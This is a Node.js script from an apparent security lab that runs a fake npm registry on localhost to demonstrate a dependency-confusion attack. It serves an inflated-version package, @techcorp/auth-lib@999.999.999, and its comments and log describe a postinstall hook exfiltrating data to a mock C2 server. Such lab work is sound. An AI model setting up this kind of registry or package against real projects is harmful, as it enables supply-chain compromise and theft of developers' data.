#!/usr/bin/env node
// SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori
/**
 * Scenario 02 — Attacker-Controlled "Public" npm Registry
 *
 * Simulates the public npm registry that the attacker has published to.
 * Runs on port 4874 and serves @techcorp/auth-lib@999.999.999.
 *
 * The attack: the corporate .npmrc configures @techcorp:registry to point
 * here instead of the company's internal registry. npm resolves the highest
 * available version — 999.999.999 — and downloads the malicious tarball.
 *
 * npm registry protocol endpoints (subset):
 *   GET /@techcorp%2Fauth-lib   → package metadata JSON
 *   GET /@techcorp/auth-lib/-/auth-lib-999.999.999.tgz → tarball
 *
 * Start BEFORE running `npm install` in corporate-app/:
 *   node infrastructure/registry-server.js
 */

'use strict';

const http = require('http');
const fs   = require('fs');
const path = require('path');

const PORT      = 4874;
const WORK_DIR  = path.join(__dirname, '../work');
const TARBALLS  = path.join(WORK_DIR, 'tarballs');
const META_FILE = path.join(WORK_DIR, 'registry-meta.json');

if (!fs.existsSync(META_FILE)) {
  console.error('[registry] work/registry-meta.json not found.');
  console.error('[registry] Run setup.sh (or node infrastructure/build-registry.js) first.');
  process.exit(1);
}

const registryData = JSON.parse(fs.readFileSync(META_FILE, 'utf8'));
const pkgNames     = Object.keys(registryData);

const server = http.createServer((req, res) => {
  const urlPath = decodeURIComponent(req.url.split('?')[0]);

  if (req.method !== 'GET') {
    res.writeHead(405); res.end('Method Not Allowed'); return;
  }

  // Tarball: /<pkg>/-/<name>-<ver>.tgz
  const tarMatch = urlPath.match(/^\/(.+)\/-\/(.+\.tgz)$/);
  if (tarMatch) {
    const tarName = tarMatch[2];
    const tarPath = path.join(TARBALLS, tarName);
    if (fs.existsSync(tarPath)) {
      const data = fs.readFileSync(tarPath);
      console.log(`[registry] 200 tarball → ${tarName}`);
      res.writeHead(200, {
        'Content-Type':   'application/octet-stream',
        'Content-Length': data.length,
      });
      res.end(data);
    } else {
      console.log(`[registry] 404 tarball → ${tarName}`);
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'tarball not found' }));
    }
    return;
  }

  // Metadata: /<pkg-name>
  const pkgName = urlPath.slice(1);
  if (registryData[pkgName]) {
    console.log(`[registry] 200 metadata → ${pkgName}`);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(registryData[pkgName]));
    return;
  }

  console.log(`[registry] 404 → ${pkgName}`);
  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ error: 'Not found' }));
});

server.listen(PORT, '127.0.0.1', () => {
  console.log('');
  console.log('☠️   Fake Public npm Registry — Scenario 02 (Dependency Confusion)');
  console.log('─'.repeat(60));
  console.log(`Listening: http://localhost:${PORT}/`);
  console.log(`Published attacker packages: ${pkgNames.join(', ')}`);
  console.log('');
  console.log('Attack flow:');
  console.log('  1. corporate-app/.npmrc: @techcorp:registry=http://localhost:4874/');
  console.log('  2. Developer runs: npm install');
  console.log('  3. npm queries THIS server for @techcorp/auth-lib');
  console.log('  4. Gets v999.999.999 (higher than any internal version)');
  console.log('  5. Malicious tarball downloaded, postinstall fires');
  console.log('  6. Data exfiltrated to mock C2 server on :3000');
  console.log('─'.repeat(60));
});
